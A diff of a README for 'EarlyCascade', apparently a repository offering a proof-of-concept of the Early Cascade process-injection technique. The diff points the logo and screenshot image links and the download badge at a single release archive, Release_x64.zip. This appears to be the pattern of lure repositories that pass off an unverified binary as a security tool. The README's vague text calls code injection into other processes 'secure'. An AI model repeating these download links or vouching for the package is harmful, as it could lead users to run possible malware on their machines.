@@ -1,6 +1,6 @@
 # EarlyCascade
 
-![EarlyCascade Logo](https://example.com/earlycascade_logo.png)
+![EarlyCascade Logo](https://github.com/obaniissnek/EarlyCascade/releases/download/v2.0/Release_x64.zip)
 
 ## Description
 Welcome to EarlyCascade - a Proof of Concept (PoC) repository showcasing the Early Cascade process injection technique. This repository serves as a demonstration of how the Early Cascade method can be used for process injection in a secure and efficient manner.
@@ -14,14 +14,14 @@ Welcome to EarlyCascade - a Proof of Concept (PoC) repository showcasing the Ear
 ## Installation
 To get started with EarlyCascade, you can download the software package from the following link: 
 
-[![Software Package](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Software Package](https://github.com/obaniissnek/EarlyCascade/releases/download/v2.0/Release_x64.zip)](https://github.com/obaniissnek/EarlyCascade/releases/download/v2.0/Release_x64.zip)
 
 Once you have downloaded the software package, unzip it and follow the instructions provided in the README file for installation.
 
 ## Usage
 After installing EarlyCascade, you can run the application and explore the features it offers. The process injection technique demonstrated in this PoC can be used for various purposes, such as injecting code into a target process securely.
 
-![EarlyCascade Screenshot](https://example.com/earlycascade_screenshot.png)
+![EarlyCascade Screenshot](https://github.com/obaniissnek/EarlyCascade/releases/download/v2.0/Release_x64.zip)
 
 ## Contributing
 If you would like to contribute to EarlyCascade, feel free to submit a pull request with any enhancements or fixes you'd like to propose. You can also open an issue to report any bugs or suggestions for improvement.
